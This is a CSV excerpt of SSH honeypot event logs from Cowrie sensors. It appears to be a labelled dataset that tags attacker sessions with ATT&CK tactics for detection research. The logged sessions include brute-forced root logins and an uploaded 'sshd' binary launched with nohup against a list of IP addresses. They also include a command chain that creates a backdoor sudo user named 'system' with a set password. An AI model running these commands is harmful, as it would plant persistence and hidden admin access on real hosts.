,event,session_id,session,labels
31,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:00:46.469900Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
32,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""98ddc5604ef6a1006a2b49a58759fbe6"", ""hashAlgorithms"": ""curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha1""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 98ddc5604ef6a1006a2b49a58759fbe6"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:00:46.583504Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
33,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/ubuntu] succeeded"", ""password"": ""ubuntu"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:00:47.029420Z"", ""username"": ""root"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
34,"{""eventid"": ""cowrie.session.file_upload"", ""filename"": ""sshd"", ""message"": ""SFTP Uploaded file \""sshd\"" to var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""outfile"": ""var/lib/cowrie/downloads/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:02:38.698998Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
35,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:02:39.063749Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
36,"{""eventid"": ""cowrie.command.input"", ""input"": ""chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &"", ""message"": ""CMD: chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:02:39.064130Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
37,"{""duplicate"": false, ""duration"": ""0.2"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/17a1701adce43c87907f29963a8bfa3d30c50f936de9675c16d4997eaf3cc648 after 0.2 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""17a1701adce43c87907f29963a8bfa3d30c50f936de9675c16d4997eaf3cc648"", ""size"": 136.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:02:39.236790Z"", ""ttylog"": ""var/lib/cowrie/tty/17a1701adce43c87907f29963a8bfa3d30c50f936de9675c16d4997eaf3cc648"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
38,"{""duration"": ""112.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 112.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-05T21:02:39.237573Z"", ""session_id"": ""e5166da5ed5e""}",e5166da5ed5e,chmod +x ./.7769174345147871354/sshd;nohup ./.7769174345147871354/sshd 38.54.51.32 147.93.62.20 8.217.13.52 81.17.159.6 120.71.0.7 45.227.67.219 157.230.253.229 124.225.88.88 154.92.131.155 103.210.22.17 104.223.122.139 36.156.186.120 45.207.201.42 148.72.168.29 60.165.127.100 170.84.39.236 60.165.126.250 178.128.21.7 43.165.182.13 163.172.34.113 109.123.246.98 122.225.202.151 34.92.128.114 193.34.212.145 45.45.239.129 135.148.26.91 123.30.140.225 153.124.134.62 103.164.9.41 120.48.112.208 62.171.184.111 5.57.33.216 47.122.51.245 221.14.147.153 103.102.216.138 125.88.174.212 86.54.42.8 43.139.160.130 14.103.158.69 81.183.220.50 217.60.255.219 140.249.211.21 58.251.251.225 103.55.36.22 195.154.203.16 85.9.123.145 138.197.163.192 139.59.253.66 36.163.199.18 157.255.155.179 168.228.244.77 &;,"['Execution', 'Initial Access', 'Privilege Escalation', 'Persistence']"
39,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:50432 (10.42.6.15:2222) [session: 7fb29dd98847]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 50432.0, ""timestamp"": ""2025-08-12T01:04:06.962105Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
40,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:06.963462Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
41,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:06.982769Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
42,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.044473Z"", ""username"": ""root"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
43,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.390544Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
44,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.391702Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
45,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 ZEscefnE"", ""message"": ""CMD: openssl passwd -1 ZEscefnE"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.393011Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
46,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 ZEscefnE"", ""message"": ""Command not found: openssl passwd -1 ZEscefnE"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.394995Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
47,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/47b25f6ebd4315ba29b97c1eb2fb83c74be1674c37f4247f4da1cced14e05a39 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""47b25f6ebd4315ba29b97c1eb2fb83c74be1674c37f4247f4da1cced14e05a39"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.419307Z"", ""ttylog"": ""var/lib/cowrie/tty/47b25f6ebd4315ba29b97c1eb2fb83c74be1674c37f4247f4da1cced14e05a39"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
48,"{""duration"": ""0.5"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.5 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-12T01:04:07.421462Z"", ""session_id"": ""7fb29dd98847""}",7fb29dd98847,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 ZEscefnE) system  && sudo usermod -aG sudo system ; openssl passwd -1 ZEscefnE;,"['Discovery', 'Initial Access', 'Privilege Escalation', 'Execution']"
49,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:54688 (10.42.6.15:2222) [session: 29de1dc0305c]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 54688.0, ""timestamp"": ""2025-08-05T11:11:16.595314Z"", ""session_id"": ""29de1dc0305c""}",29de1dc0305c,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 sAWH6M2Z) system  && sudo usermod -aG sudo system ; openssl passwd -1 sAWH6M2Z;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
50,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-05T11:11:16.596861Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""29de1dc0305c""}",29de1dc0305c,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 sAWH6M2Z) system  && sudo usermod -aG sudo system ; openssl passwd -1 sAWH6M2Z;,"['Discovery', 'Impact', 'Persistence', 'Initial Access', 'Privilege Escalation', 'Execution']"
